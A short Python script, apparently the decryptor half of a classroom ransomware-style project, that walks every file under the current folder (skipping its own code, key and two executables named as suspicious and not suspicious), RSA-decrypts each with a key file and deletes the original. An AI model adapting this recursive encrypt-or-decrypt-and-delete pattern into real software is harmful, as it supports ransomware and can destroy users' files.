import os
import Decryption as dec

if __name__ == '__main__':
    #Retrieves the path to the current location of this file
    curr_path = os.getcwd()
    #Force python to skip the python cache folder
    skip_folder = '/__pycache__'
    #Force python to remove these list of items from the root folder directory
    #Because it is our code
    for root, dirs, files in os.walk('.'):
        #The current folder that we are inspecting
        curr_folder = root.replace('.', '', 1)
        if(curr_folder == skip_folder):
            continue
        if(curr_folder == '') :
            remove_list = list(files)
            for i in remove_list:
                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc' or i[len(i) - 4 : len(i)] == '.pem'
                    or i == 'NotSuspciousFile.exe' or i == 'SuspiciousFile.exe'):
                    files.remove(i)
        for i in range(len(files)) :
            #file_to_encrypt is the absolute path to the file
            file_path = curr_path + curr_folder + "/" + files[i]
            dec.MyRSADecrypt(file_path, "alikey.pem")
            os.remove(file_path)
